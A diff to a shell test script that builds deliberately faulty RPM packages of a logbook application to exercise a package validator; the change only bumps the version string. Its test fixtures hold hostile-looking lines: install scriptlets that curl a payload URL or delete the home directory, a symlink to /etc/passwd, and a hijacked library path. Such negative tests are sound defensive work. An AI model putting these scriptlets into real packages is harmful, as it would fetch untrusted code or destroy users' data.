@@ -69,7 +69,7 @@ refresh_metadata() {
     case "${MANIFEST_MODE}" in
         full)
             sh scripts/linux_rpm_manifest.sh "${CASE}/pkg.rpm" "${CASE}/pkg.rpm.manifest" \
-                splogbook 1.3.0 1 x86_64 "${EXPECTED_COMMIT}" \
+                splogbook 1.4.0 1 x86_64 "${EXPECTED_COMMIT}" \
                 > "${CASE}/manifest.log" 2>&1 \
                 || {
                     cat "${CASE}/manifest.log" >&2
@@ -184,7 +184,7 @@ mutate_bad_manifest() {
 # --- metadata mutations ----------------------------------------------
 mutate_bad_name() {
     prepare_root
-    rebuild splogbook-wrong 1.3.0 1 x86_64
+    rebuild splogbook-wrong 1.4.0 1 x86_64
 }
 
 mutate_bad_version() {
@@ -194,7 +194,7 @@ mutate_bad_version() {
 
 mutate_bad_release() {
     prepare_root
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_bad_arch() {
@@ -205,65 +205,65 @@ mutate_bad_arch() {
     rm -f "${CASE}/root/opt/SPLogbook/SPLogbook" \
         "${CASE}/root/opt/SPLogbook/splogbook-updater" \
         "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.4"
-    rebuild splogbook 1.3.0 1 noarch
+    rebuild splogbook 1.4.0 1 noarch
 }
 
 mutate_bad_commit() {
     prepare_root
     sed -i 's/"build_commit": "[0-9a-f]*"/"build_commit": "1111111111111111111111111111111111111111"/' \
         "${CASE}/root/opt/SPLogbook/.splogbook-rpm-marker"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_bad_target() {
     prepare_root
     sed -i 's/"target": "linux-x86_64"/"target": "linux-aarch64"/' \
         "${CASE}/root/opt/SPLogbook/.splogbook-rpm-marker"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 # --- payload mutations -----------------------------------------------
 mutate_missing_binary() {
     prepare_root
     rm -f "${CASE}/root/opt/SPLogbook/SPLogbook"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_missing_updater() {
     prepare_root
     rm -f "${CASE}/root/opt/SPLogbook/splogbook-updater"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_missing_launcher() {
     prepare_root
     rm -f "${CASE}/root/usr/bin/splogbook"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_extra_file() {
     prepare_root
     printf 'ROGUE\n' > "${CASE}/root/opt/SPLogbook/rogue.txt"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_extra_lib() {
     prepare_root
     cp "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.4" \
         "${CASE}/root/opt/SPLogbook/lib/rogue.so.1"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_launcher_mode() {
     prepare_root
     chmod 0644 "${CASE}/root/usr/bin/splogbook"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_owner() {
     prepare_root
     chown 65534:65534 "${CASE}/root/usr/bin/splogbook"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_symlink() {
@@ -271,104 +271,104 @@ mutate_symlink() {
     rm -f "${CASE}/root/opt/SPLogbook/LICENSE"
     ln -s /etc/passwd "${CASE}/root/opt/SPLogbook/LICENSE"
     MANIFEST_MODE="artifact-only"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_missing_hamlib() {
     prepare_root
     rm -f "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.4"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_wrong_soname() {
     prepare_root
     mv "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.4" \
         "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.5"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_hamlib_not_elf() {
     prepare_root
     printf 'NOT AN ELF SHARED OBJECT\n' \
         > "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.4"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_runpath() {
     prepare_root
     patchelf --set-rpath /tmp/evil "${CASE}/root/opt/SPLogbook/SPLogbook"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_rpath() {
     prepare_root
     patchelf --force-rpath --set-rpath /tmp/evil "${CASE}/root/opt/SPLogbook/SPLogbook"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_unresolved_library() {
     prepare_root
     patchelf --replace-needed libasound.so.2 libsplog-missing.so.0 \
         "${CASE}/root/opt/SPLogbook/SPLogbook"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 # --- launcher and desktop mutations ----------------------------------
 mutate_launcher_sudo() {
     prepare_root
     printf 'sudo /bin/true\n' >> "${CASE}/root/usr/bin/splogbook"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_launcher_ldpath() {
     prepare_root
     printf 'LD_LIBRARY_PATH=/tmp\n' >> "${CASE}/root/usr/bin/splogbook"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_bad_exec() {
     prepare_root
     sed -i 's|^Exec=.*|Exec=/bin/sh|' \
         "${CASE}/root/usr/share/applications/splogbook.desktop"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_missing_icon() {
     prepare_root
     rm -f "${CASE}/root/usr/share/icons/hicolor/256x256/apps/splogbook.png"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_missing_marker() {
     prepare_root
     rm -f "${CASE}/root/opt/SPLogbook/.splogbook-rpm-marker"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 mutate_bad_glibc() {
     prepare_root
     sed -i 's/"maximum_glibc": "2.43"/"maximum_glibc": "2.44"/' \
         "${CASE}/root/opt/SPLogbook/.splogbook-rpm-marker"
-    rebuild splogbook 1.3.0 1 x86_64
+    rebuild splogbook 1.4.0 1 x86_64
 }
 
 # --- scriptlet mutations ---------------------------------------------
 mutate_pre_scriptlet() {
     prepare_root
     printf '%%pre\nprintf "pre\\\\n"\n' > "${CASE}/extra.spec"
-    rebuild splogbook 1.3.0 1 x86_64 "${CASE}/extra.spec"
+    rebuild splogbook 1.4.0 1 x86_64 "${CASE}/extra.spec"
 }
 
 mutate_network_scriptlet() {
     prepare_root
     printf '%%pre\ncurl http://example.com/payload\n' > "${CASE}/extra.spec"
-    rebuild splogbook 1.3.0 1 x86_64 "${CASE}/extra.spec"
+    rebuild splogbook 1.4.0 1 x86_64 "${CASE}/extra.spec"
 }
 
 mutate_user_data_scriptlet() {
     prepare_root
     printf '%%pre\nrm -rf "$HOME"\n' > "${CASE}/extra.spec"
-    rebuild splogbook 1.3.0 1 x86_64 "${CASE}/extra.spec"
+    rebuild splogbook 1.4.0 1 x86_64 "${CASE}/extra.spec"
 }
 
 echo "=================================================================="
